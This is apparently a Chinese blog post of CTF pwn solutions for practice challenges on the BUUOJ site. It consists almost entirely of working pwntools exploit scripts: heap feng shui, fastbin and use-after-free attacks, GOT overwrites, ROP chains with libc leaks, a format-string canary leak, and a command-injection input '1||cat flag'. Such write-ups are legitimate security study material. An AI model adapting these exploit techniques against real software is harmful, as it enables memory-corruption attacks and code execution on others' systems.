---
toc: true
classes: wide
layout: single
title:  "Buuoj冲分过程（指俯冲）その２"
date:   2021-01-04 12:10:38 +0800
categories: 
  - blog
tags:
  - pwn
---

# Buuoj冲分过程（指俯冲）その２


## Problems

### babyfengshui_33c3_2016

```python

#!/usr/bin/python3.6
from pwn import *
from LibcSearcher import LibcSearcher

filename = './babyfengshui_33c3_2016'
e = ELF(filename)
p = process(filename)
# p = remote("node3.buuoj.cn", 29672)

def Add(name, text, text_buf_len=None, text_len=None):
    """
    struct st { char* desc; char name[0x7c]; };
    输入 description 长度，malloc指定长度得ptr_desc，然后memset置零
    再malloc(0x80),同样置零得ptr_st，这个应该是一个结构体，ptr_st.ptr_desc = ptr_desc
    结构体指针数组 arr_st[index] = ptr_st
    然后f1 get_name(arr_st[index].name, 0x7c) -> fgets(v0, v1, STDIN), strchr(v0, 0x0a)[0]=0
    index+=1
    f2 get_text(index-1) -> if check arr_st[a0].desc+len < (arr_st[a0] - 4) <---- &(chunk.size), then get_name(arr_st[a0].desc, len+1) 
    """
    p.sendlineafter(b'Action: ', b'0')
    p.sendlineafter(b'size of description: ', bytes(f'{text_buf_len or len(text)}', encoding='utf8'))
    p.sendlineafter(b'name: ', name)
    p.sendlineafter(b'text length: ', bytes(f'{text_len or len(text)}', encoding='utf8'))
    p.sendlineafter(b'text: ', text)


def Delete(index):
    """
    free(arr_st[a0].desc)
    free(arr_st[a0])
    arr_st[0] = NULL
    """
    p.sendlineafter(b'Action: ', b'1')
    p.sendlineafter(b'index: ', bytes(f'{index}', encoding='utf8'))


def Display(index):
    """
    printf("%s", arr_st[a0].name)
    printf("%s", arr_st[a0].desc)
    """
    p.sendlineafter(b'Action: ', b'2')
    p.sendlineafter(b'index: ', bytes(f'{index}', encoding='utf8'))


def Update(index, text, text_len=None):
    """"""
    p.sendlineafter(b'Action: ', b'3')
    p.sendlineafter(b'index: ', bytes(f'{index}', encoding='utf8'))
    p.sendlineafter(b'text length: ', bytes(f'{text_len or len(text)}', encoding='utf8'))
    p.sendlineafter(b'text: ', text)


def Exit():
    p.sendlineafter(b'Action: ', b'4')


Add(b'name0', b'desc0', text_buf_len=0x10-8)  # index=0, 0x10 0x88, x
Add(b'name1', b'desc1', text_buf_len=0x10-8)  # index=1, 0x10 0x88
Add(b'name2', b'desc2', text_buf_len=0x10-8)  # index=2, 0x10 0x88, x
Add(b'/bin/sh', b'/bin/sh')  # index=3, 0x10 0x88, 

c_func_name = 'free'
c_func_got = e.got[c_func_name]

Delete(0)
Delete(2)
payload_leak_got = b'x' * (0x88 - 8) + \
    b'xxxx' + p32(0x10|0x1) + b'x'*8 + \
    b'yyyy' + p32(0x88|0x1) + p32(c_func_got) + b'\x00'

Add(b'name4', payload_leak_got, text_buf_len=0x80-0x8)  # index=4
Display(1)
p.recvuntil(b'description: ')
c_func_addr = u32(p.recv(4))
log.success(f'c: {c_func_name}() address={hex(c_func_addr)}')

searcher = LibcSearcher(func=c_func_name, address=c_func_addr)
c_base_addr = c_func_addr - searcher.dump(c_func_name)
system_addr = c_base_addr + searcher.dump('system')

log.success(f'c base address={hex(c_base_addr)}; system()={hex(system_addr)}')

Update(1, p32(system_addr) + b'zzzz')

Delete(3)
p.interactive()
```

### jarvisOJ_level3_x64

```python
#!/usr/bin/python3.6
from pwn import *
from LibcSearcher import LibcSearcher

filename = './level3_x64'
# p = process(filename)
p = remote('node3.buuoj.cn', 28216)
elf = ELF(filename)
libc = ELF('./libc/ubuntu_16_x86_64_libc-2.23.so')

pop_rdi_ret = 0x00000000004006b3
pop_rsi_r15_ret = 0x00000000004006b1

log.info(f'write@plt={hex(elf.plt["write"])}, write in symbols: {hex(libc.sym["write"])}')

payload = b'a'*(0x80+8) + p64(pop_rdi_ret) + p64(1) + p64(pop_rsi_r15_ret) + p64(elf.got["write"]) + p64(0) + p64(elf.plt["write"]) + p64(elf.sym["main"])
p.sendlineafter(b'Input:\n', payload)

write_address = u64(p.recv(8))

searcher = LibcSearcher()
searcher.add_condition('write', write_address)


base_address = write_address - libc.sym['write']
gadgets = [0x4526a, 0xf02a4, 0xf1147, 0x45216]

one_gadget = gadgets[1] + base_address
log.info(f'write={hex(write_address)}, libc={hex(base_address)}, gadget={hex(one_gadget)}')

payload = b'a'*(0x80+8) + p64(one_gadget)
p.sendlineafter(b'Input:\n', payload)
p.interactive()
```

### [ZJCTF 2019]EasyHeap

```python
#!/usr/bin/python3.6
from pwn import *

filename = './easyheap'
# p = process(filename)
p = remote('node3.buuoj.cn', 26098)
elf = ELF(filename)


def heap_create(content, size=None):
    p.sendlineafter(b'Your choice :', b'1')
    p.sendlineafter(b'Size of Heap : ', bytes(f'{size or (len(content) + 1)}', encoding='utf8'))
    p.sendlineafter(b'Content of heap:', content)

def heap_edit(index, content, size=None):
    p.sendlineafter(b'Your choice :', b'2')
    p.sendlineafter(b'Index :', bytes(f'{index}', encoding='utf8'))
    p.sendlineafter(b'Size of Heap : ', bytes(f'{size or (len(content) + 1)}', encoding='utf8'))
    p.sendlineafter(b'Content of heap : ', content)

def heap_delete(index):
    p.sendlineafter(b'Your choice :', b'3')
    p.sendlineafter(b'Index :',  bytes(f'{index}', encoding='utf8'))

fake_chunk = 0x6020ad  # x/16gx 0x6020c0-0x10+5-8

heap_create(b'@@@@@@@@', size=0x18)     # 0, 0x20
heap_create(b'!!!!!!!!', size=0x18)     # 1, 0x20
heap_create(b'????????', size=0x68)     # 2, 0x70
heap_delete(2)                          # 把 2 放进去 fastbin
heap_edit(1, b'}' * 0x18 + p64(0x71) + p64(fake_chunk) + p64(fake_chunk))  # 构造 fastbin 链表，插入一个假的chunk，这个chunk在heap_array上方若干字节处
heap_create(b']]]]]]]]', size=0x68)     # 2, 0x70, get the original chunk of 2
heap_create(b'[[[[[[[[', size=0x68)     # 3, 0x70, get the fake chunk
# -_-||| 看到ida里面有 system(cat flag) 还以为可以直接触发，结果。。。
# cat: /home/pwn/flag: No such file or directory
# heap_edit(3, b':'*(0x6020c0-0x6020bd) + p64(0x1333))
# p.sendlineafter(b'Your choice :', bytes(f'{0x1305}', encoding='utf8'))


# https://n0vice.top/2020/04/25/%E5%B8%B8%E8%A7%81fastbin-attack%E5%A5%97%E8%B7%AF%E5%AD%A6%E4%B9%A0/
# 写入system的plt地址到free的got，再free(/bin/sh)
heap_array = 0x6020e0  # p/x &heaparray
log.info(f'free@got={hex(elf.got["free"])}, system@plt={hex(elf.plt["system"])}')
heap_edit(3, b':'*(0x6020e0-(fake_chunk + 0x10)) + p64(elf.got["free"]))
heap_edit(0, p64(elf.plt["system"]))
heap_edit(2, b'/bin/sh')
heap_delete(2)

p.interactive()
```

### picoctf_2018_rop

```python
#!/usr/bin/python3.6
from pwn import *

filename = './picoctf_2018_rop'
# p = process(filename)
p = remote('node3.buuoj.cn', 28747)
elf = ELF(filename)

win1 = elf.sym['win_function1']
win2 = elf.sym['win_function2']
flag = elf.sym['flag']
main = elf.sym['main']

pop_ebx_ret = 0x0804840d
payload = b'!'*0x18 + p32(0) + p32(win1) + p32(win2) + p32(pop_ebx_ret) + p32(0x0BAAAAAAD) + p32(flag) + p32(main) + p32(0x0DEADBAAD)

p.sendlineafter(b'Enter your input> ', payload)
p.interactive()
```

### [V&N2020 公开赛]simpleHeap

[传送门]({{ site.url }}/blog/buuoj-pwn-heap-vn_pwn_simpleHeap/)

### bjdctf_2020_babyrop2
这是一个开了栈溢出保护的ROP题目，里面有一个格式字符串漏洞可以输出canary。由于64bit系统前6个参数通过寄存器传递，这个地方需要输出第7个参数的话要用上一点[技巧](https://stackoverflow.com/a/44192302/8706476)。此外这个地方用printf搜不到libc，原因暂时没搞清楚。
```python
#!/usr/bin/python3.6
from pwn import *
from LibcSearcher import LibcSearcher

filename = './bjdctf_2020_babyrop2'
#p = process(filename)
p = remote('node3.buuoj.cn', 29094)
elf = ELF(filename)
#libc = ELF(f'/lib/x86_64-linux-gnu/libc.so.6')
#libc = ELF(f'libc/ubuntu_16_x86_64_libc-2.23.so')

p.sendlineafter(b"I'll give u some gift to help u!\n", b'%7$lx')
canary = int(p.recvuntil(b'\n')[:-1], 16)
assert canary > 0
log.success(f'canary found: {hex(canary)}')

pop_rdi_ret = 0x0000000000400993

leak = b'\x11'*(0x20-8) + p64(canary) + b'\x22'*8 + p64(pop_rdi_ret) + p64(elf.got['__isoc99_scanf']) + p64(elf.plt['printf']) + p64(elf.sym['vuln'])
p.sendlineafter(b'Pull up your sword and tell me u story!\n', leak)
ret = p.recv(6).ljust(8, b'\x00')
c_func_addr = u64(ret)
c_func_name = '__isoc99_scanf'
searcher = LibcSearcher(func=c_func_name, address=c_func_addr)

base = c_func_addr - searcher.dump(c_func_name)
system = base + searcher.dump('system')
bin_sh = base + searcher.dump('str_bin_sh')
log.success(f'{c_func_name}:{hex(c_func_addr)}, base={hex(base)}, system={hex(system)}, /bin/sh={hex(bin_sh)}')

exploit = b'\x11'*(0x20-8) + p64(canary) + b'\x22'*8 + p64(pop_rdi_ret) + p64(bin_sh) + p64(system)
p.sendline(exploit)
p.interactive()
```

### jarvisoj_test_your_memory

```python
#!/usr/bin/python3.6
from pwn import *
from LibcSearcher import LibcSearcher

filename = './memory'
#p = process(filename)
p = remote('node3.buuoj.cn', 28369)
elf = ELF(filename)

cmd_str = 0x080487e0
func_addr = elf.sym['win_func']
main_addr = elf.sym['main']
#p.sendlineafter(b'...', b'a'*(0x13+4) + p32(func_addr) + p32(main_addr) + p32(cmd_str))
p.send(b'a'*(0x13+4) + p32(func_addr) + p32(main_addr) + p32(cmd_str) + b'\n')

p.interactive()
```

### bjdctf_2020_router

从stdin读取字符串当作命令执行，没有过滤。直接输入 `1||cat flag` 即可~

### hitcontraining_uaf

正如题目的名字，释放内存之后没有对相关的指针变量置零。利用 fastbin 使得 glibc分配重叠的内存，从而修改结构体的函数指针。

```python
#!/usr/bin/python3.6
from pwn import *
from LibcSearcher import LibcSearcher

filename = './hacknote'
# p = process(filename)
p = remote('node3.buuoj.cn', 29142)
elf = ELF(filename)


def add(content, size=None):
    if size is None:
        size = len(content)
    p.sendlineafter(b'Your choice :', b'1')
    p.sendlineafter(b'Note size :', bytes(f'{size}', encoding='utf8'))
    p.sendlineafter(b'Content :', content)

def del_(index):
    p.sendlineafter(b'Your choice :', b'2')
    p.sendlineafter(b'Index :', bytes(f'{index}', encoding='utf8'))

def put(index):
    p.sendlineafter(b'Your choice :', b'3')
    p.sendlineafter(b'Index :', bytes(f'{index}', encoding='utf8'))

magic_addr = 0x08048945

add(b'a'*16)
add(b'b'*16)
del_(0)
del_(1)
add(p32(magic_addr), 8)
put(0)
p.interactive()
```
